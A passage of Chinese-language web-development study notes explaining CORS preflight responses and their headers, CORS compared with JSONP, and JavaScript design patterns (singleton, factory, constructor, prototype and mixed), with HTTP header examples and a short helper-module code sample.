该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是`X-Custom-Header`。

##### 4.2 预检请求的回应

服务器收到“预检”请求以后，检查了`Origin`、`Access-Control-Request-Method`和`Access-Control-Request-Headers`字段以后，确认允许跨源请求，就可以做出回应。

```
HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:15:39 GMT
Server: Apache/2.0.61 (Unix)
Access-Control-Allow-Origin: http://api.bob.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: X-Custom-Header
Content-Type: text/html; charset=utf-8
Content-Encoding: gzip
Content-Length: 0
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/plain
```

上面的HTTP回应中，关键的是`Access-Control-Allow-Origin`字段，表示`http://api.bob.com`可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。

`Access-Control-Allow-Origin: *`

如果服务器否定了“预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被`XMLHttpRequest`对象的`onerror`回调函数捕获。控制台会打印出如下的报错信息。

```
XMLHttpRequest cannot load http://api.alice.com.
Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.
```

服务器回应的其他CORS相关字段如下。

```
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: X-Custom-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 1728000
```

1).Access-Control-Allow-Methods

该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次“预检”请求。

2).Access-Control-Allow-Headers

如果浏览器请求包括`Access-Control-Request-Headers`字段，则`Access-Control-Allow-Headers`字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在“预检”中请求的字段。

3).Access-Control-Allow-Credentials

该字段与简单请求时的含义相同。

4).Access-Control-Max-Age

该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。

##### 4.3 浏览器的正常请求和回应

一旦服务器通过了“预检”请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个`Origin`头信息字段。服务器的回应，也都会有一个`Access-Control-Allow-Origin`头信息字段。

下面是“预检”请求之后，浏览器的正常CORS请求。

```
PUT /cors HTTP/1.1
Origin: http://api.bob.com
Host: api.alice.com
X-Custom-Header: value
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
```

上面头信息的Origin字段是浏览器自动添加的。

下面是服务器正常的回应。

```
Access-Control-Allow-Origin: http://api.bob.com
Content-Type: text/html; charset=utf-8
```

上面头信息中，`Access-Control-Allow-Origin`字段是每次回应都必定包含的。

#### 5.与JSONP的比较

CORS与JSONP的使用目的相同，但是比JSONP更强大。

JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。


## 9.设计模式

### 1.单例模式

在JavaScript中，单例模式是最基本也是最重要的模式之一，这种模式提供了一种将代码组织为一个逻辑单元的手段。（单例模式可以用来划分命名空间，从而减少全局变量的数量）

在开发的时候，为了对人合作开发而使用变量的冲突问题，我们可以将变量以属性的方式写在对象中，只要对象名不冲突即可，这时我们给每个对象添加一个新的名字叫做**命名空间**；

将每个模块写在对象中的形式就是单例模式；

新单例模式，对象内用自执行函数来返回方法；

```
var public = (function () {
  function toArray(likeArray) {
    return [...likeArray]
  };

  function children(ele, tag) {
    var kid = ele.children;
    var ary = [];
    for (var i = 0; i < kid.length; i++) {
      if (kid[i].tagName === tag.toUpperCase()) {
        ary.push(kid[i])
      }
    }
    return ary;
  };

  function prevAll(ele) {
    var ary = [];
    var prev = ele.previousElementSibling;
    while (prev) {
      ary.unshift(prev);
      prev = prev.previousElementSibling
    }
    return ary;
  };
  return {
    toArray: toArray,
    children: children,
    prevAll: prevAll
  };
})();
```

> 在自己的模块中使用自己的方法属性，可以直接用`this`代替对象名；

### 2.工厂模式

我们把一些功能封装成一个函数，以后再想实现这个功能只需要取执行这个函数即可；

工厂模式用于批量生产；提供不同的原材料（传入参数），得到不一样的产品（返回值）；

### 3.构造函数

为了解决工厂模式的实例识别，使用构造函数；构造函数与其他函数唯一的区别，就在于调用他们的方式不同；

把一个函数变成类，或者说添加一个自定义的类，通过构造函数来实现；

按照惯例，构造函数始终都应该以一个大写字母开头，非构造函数以小写字母开头，主要是为了区别于其他函数；因为构造函数本身也是函数，只不过可以用来创建对象而已。

> 使用`new`关键字来创建构造函数，该函数就是一个类，此时的this指代被定义产生的实例，可以通过`this. `的形式可以给实例添加私有的属性和方法；不需要`return`，默认会将`this`返回；

> 如果要在类中设置`return`返回：若`return`返回值是引用类型会改变返回值（返回`return`的值）；若`return`返回值是基本数据类型，不会造成影响；

`实例 instanceof 类`判断某个对象是不是某个类的实例；对基本数据类型，需是构造函数产生的才是实例；对引用类型皆可；

创建自定义的构造函数意味着将来可以将他的实例标识为一种特定类型；而这正是构造函数模式胜过工厂模式的地方。

### 4.原型模式

实例的共享属性和方法存在于原型对象中；

构造函数无法解决复用问题，因为私有，所以实例之间无法共用一个系统的方法；而用Js的原型机制可以实现，这就是js面向对象的核心点；

**所有类都是函数；每个函数都有一个`prototype`（原型）属性**，是一个对象（当前类本身），这个属性类似于一个指针，指向一个特定类型的所有实例所共享的属性和方法。构造函数和实例的prototype属性都指向同一个原型对象，原型对象的方法都可以由实例取继承；

`Constructor`属性是原型对象的属性，是一个对象（当前类本身），也是一个指针，指向构造函数；大部分情况下指向构造函数，但也不少一成不变的。当构造函数的`prototype`设置为等于一个以对象字面量形式创建的新对象时，此时`Constructor`属性不再指向构造函数，而是指向对象；

**任意一个对象都会有一个属性`__proto__`**，这个属性指向所属类的原型（`prototype`）；Objectd的原型上没有`__proto__`，因为已指向自身;

### 5.混合模式

利用构造函数模式优秀的识别功能来为对象添加属性，利用原型模式的高效共享功能来为对象添加方法。
